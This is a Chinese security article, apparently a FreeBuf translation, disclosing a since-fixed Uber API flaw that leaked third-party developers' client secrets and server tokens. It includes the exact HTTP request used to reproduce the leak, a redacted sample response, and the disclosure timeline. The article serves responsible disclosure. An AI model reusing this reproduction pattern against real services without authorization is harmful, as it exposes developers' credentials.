***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

![uberhackathon.jpg](https://image.3001.net/images/20190227/1551248215_5c762b57df9a6.jpg!small)
**本文分享的漏洞涉及Uber第三方集成服务应用，通过Uber的开放接口，可以泄露第三方集成服务开发者的客户端密钥和Server
token信息。漏洞发现者为印度APP安全公司[AppSecure](https://appsecure.in/)的Anand Prakash 和
Manisha Sangwan 。漏洞上报后，Uber安全团队非常重视，进行了及时修复。**

## Uber的开发者接口

开放应用程序的
API（应用程序接口）已经成为互联网应用之间共享资源的重要方式，Uber通过向第三方集成服务合作伙伴的开发者全面开放共享API，希望可以创造一种无缝连接的移动体验，增加用户粘性，建立起自己的生态体系。

美国联合航空、微软、TripAdvisor 、Open
Table等在内的众多企业，都已在其APP中嵌入了Uber，极大地拓展了应用场景，实现了双赢。2015年9月25日，Uber宣布在中国市场向所有开发者全面开放Uber
API -<http://developer.uber.com.cn>，百度、穷游网以及渡鸦科技成为首批合作伙伴。Uber表示，无论成熟、中型亦或初创企业，都可以成为Uber
API开放计划的合作伙伴。

## 漏洞情况

存在漏洞的地方为Uber API riders.uber.com，在其上面有一个公共请求端 -<https://riders.uber.com/profile>，发起请求后，该接口响应后可以返回一些服务端的server
token，以及与Uber账户相关联的第三方授权应用的开发者客户端密钥信息（client_secret）。

Uber在[官方开发者文档中](https://developer.uber.com/docs/businesses/guides/authentication)对集成应用相关的client_secret，提醒开发者：

>
> 这是开发者应用程序相关的密钥信息，就像应用程序的密码一样，不能与他人共享，也不能在源码或公共论坛中泄露。而且，在一些用户客户端设备上，也要确保该密钥信息不能被反编译获取。如果你怀疑该密钥信息已被泄露，请尽快在你的开发应用管理面板中生成一个新密钥，以此取代旧的密钥。

对攻击者来说，该漏洞利用很简单，只要用他自己的账户去关联绑定生产环境中的任意一个Uber第三方应用，如
IFTTT、Payfare和Bixby等，然后利用<https://riders.uber.com/profile>发起请求，在其API的返回响应中，就能获得开发者的server
token，和与第三方应用相关联的开发者客户端密钥信息。  

## 漏洞复现

1、攻击者在OAuth认证方式下，用自己的账户去关联任意一个Uber第三方应用，如 IFTTT、Payfare和Bixby等；

2、攻击者把自己的账户关联绑定到以上应用之后，用自己的session会话数据，发起<https://riders.uber.com/profile>的POST请求，就能获得开发者的一些敏感信息。

存在漏洞的Uber API为<https://riders.uber.com/>，以下为对其发起的POST请求：

    
    
    POST /api/getAuthorisedApps HTTP/1.1
    Host: riders.uber.com
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://riders.uber.com/profile
    content-type: application/json
    x-csrf-token: XXX
    origin: https://riders.uber.com
    Content-Length: 2
    Cookie:

以下为API的响应消息，在其中就包含了一些如applicationSecret、userEmail、userUUID等开发者的敏感信息：

    
    
    {“status”:”success”,”data”:{“data”:{“uuid”:”xxxx”},”clientScopes”:{“authorizedClientScopes”:[{“clientID”:”xxx”,”scopes”:[“history”,”offline_access”,”profile”]}]},”scopeDetails”:[{“applicationDetails”:{“applicationID”:”xxx”,”owner”:{“userUUID”:”xxxx”,”userEmail”:””},”applicationSecret”:”xxx”,”name”:”xxx”,”description”:”abc”,”privacyPolicyURL”:”https://appsecure.in","surgeConfirmedRedirectURI":"","webhookURL":"","applicationType":"","requestsPerHour":{"low":0,"high":0,"unsigned":false},"redirectURIs":["xxxxxx"],"appSignatures":[],"defaultScopes":["history","profile"],"whitelistedScopes":[],"originURIs":[],"serverTokens":["xxx"],"ipWhitelist":[],"admins":[{"userUUID":"xxxx","userEmail":""},{"userUUID":"xxxx","userEmail":""},{"userUUID":"xxxx","userEmail":""}],"developers":[{"userUUID":"xxxx","userEmail":""}],"tags":[],"oauthEnabled":false,"smsVerificationEnabled":false,"cobrandingEnabled":false,"supplyOnly":false,"isInternal":true,"cobrandingDetails":{"nativeURL":"","androidFallbackURL":"","iosFallbackURL":"","displayName":"","linkName":"","logoUUID":"","logoFiletype":"","generatedLogoURL":""},"availableScopes":["delivery","history","history_lite","places","profile","ride_widgets"],"openScopes":["delivery","history","history_lite","places","profile","ride_widgets"],"developerScopes":["all_trips","request","request_receipt"],"createdAt":{"low":xxx,"high":0,"unsigned":false},"updatedAt":{"low":xxx,"high":0,"unsigned":false},"displayName":null,"iconURL":null,"publicDescription":null,"appGalleryDetails":{"mobilePlatforms":[],"publicationState":"","redirectURI":"xxxx","permissionState":""}},"permissions":null,"userRoleInvitations":null}]}}

## 漏洞修复进程

> 2018.10.5 漏洞初报
>
> 2018.10.6 Uber接收漏洞，AppSecure公司要求Uber通知第三方应用合作伙伴，提醒应用程序开发者该漏洞情况，确保开发者密钥的安全保密
>
> 2018.12.20 Uber回复称，“正在通知合作伙伴，并会为该漏洞制订长期解决方案”
>
> 2019.2.8 Uber向我们发放$5000赏金，并告知已经通过邮件方式通知了所有合作伙伴开发团队人员

Uber删除了riders.uber.com API中的敏感响应信息，并提醒开发人员要定期更换开发者密钥。

![1_5cU8gS2vFolwBtJbv_9SpQ.png](https://image.3001.net/images/20190227/1551248259_5c762b83b959b.png!small)
***参考来源：[medium](https://medium.com/@appsecure/leakage-of-client-secret-server-tokens-of-all-uber-developer-applications-657d9d7fd30e)，clouds编译，转载请注明来自FreeBuf.COM **  

